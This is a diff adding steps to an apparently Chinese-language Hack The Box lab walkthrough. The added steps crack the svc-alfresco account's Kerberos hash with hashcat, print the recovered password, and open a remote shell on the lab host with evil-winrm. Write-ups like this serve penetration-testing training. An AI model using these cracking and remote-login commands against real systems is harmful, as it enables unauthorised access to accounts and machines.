@@ -73,11 +73,32 @@ enum4linux 10.129.154.107
 
 <figure><img src="../../.gitbook/assets/13 (10).png" alt=""><figcaption></figcaption></figure>
 
+* 已找到了用户svc-alfresco 帐户的哈希值，将该哈希值保存为hashes.txt文件，然后查找该哈希对应的模式，hashcat暴力破解其明文密码：
 
+```bash
+hashcat -m 18200 hashes.txt rockyou.txt
+```
+
+<figure><img src="../../.gitbook/assets/14.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/15.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/16.png" alt=""><figcaption></figcaption></figure>
 
 ### GET SHELL
 
+* 至此，以获取到一个有效凭证：<mark style="color:red;">**svc-alfresco:s3rvice**</mark>
+* 利用这个有效凭证和evil-winrm，尝试get shell：
 
+```bash
+evil-winrm -i htb.local -u svc-alfresco -p 's3rvice' 
+```
+
+* 成功登录，并找到了第一个flag：
+
+<figure><img src="../../.gitbook/assets/17.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/18 (7).png" alt=""><figcaption></figcaption></figure>
 
 ## 权限提升
 
